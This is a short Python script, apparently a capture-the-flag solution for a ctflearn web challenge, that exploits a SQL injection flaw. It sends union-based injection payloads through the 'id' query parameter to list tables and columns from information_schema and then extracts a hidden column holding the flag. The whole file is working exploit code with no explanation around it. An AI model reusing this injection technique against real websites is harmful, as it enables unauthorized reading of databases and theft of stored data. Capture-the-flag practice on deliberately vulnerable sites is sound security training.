import requests
import re

url = "http://web.ctflearn.com/web8"

def leak(col, table, additional=''):
    res = requests.get(url, params={
        "id": f'0 union select 1,{col},1,1 from {table} {additional} #'
    })

    leak = re.findall(r'Name: (.+?)<br>', res.text.replace("\n", ' '))
    print('\n'.join(leak))

leak('table_name', 'information_schema.tables', "where table_schema=DATABASE()")
leak('column_name', 'information_schema.columns', "where table_name like 0x77307725")
leak('f0und_m3', 'w0w_y0u_f0und_m3')